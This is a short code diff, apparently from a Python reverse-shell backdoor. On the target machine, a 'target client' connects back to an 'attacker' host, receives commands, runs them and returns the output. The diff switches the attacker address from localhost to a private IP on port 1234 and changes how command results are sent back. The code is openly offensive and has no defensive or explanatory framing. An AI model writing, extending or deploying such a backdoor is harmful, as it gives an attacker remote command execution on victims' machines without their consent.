@@ -8,7 +8,7 @@ target_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # connects with the attacker 
 def target_client_connector():
     # connect to the attacker
-    attacker_hostname = "localhost"
+    attacker_hostname = "192.168.43.34"
     attacker_port = 1234
     while(True):
         success = target_client.connect_ex((attacker_hostname, attacker_port))
@@ -41,7 +41,7 @@ def receive_data():
     except:
         pass
     # send result back
-    send_data("Result: " + output)
+    send_data("\n" + output)
 
 def navigate_directory(command):
     destination_directory_path = command[command.index("cd") + 3:]
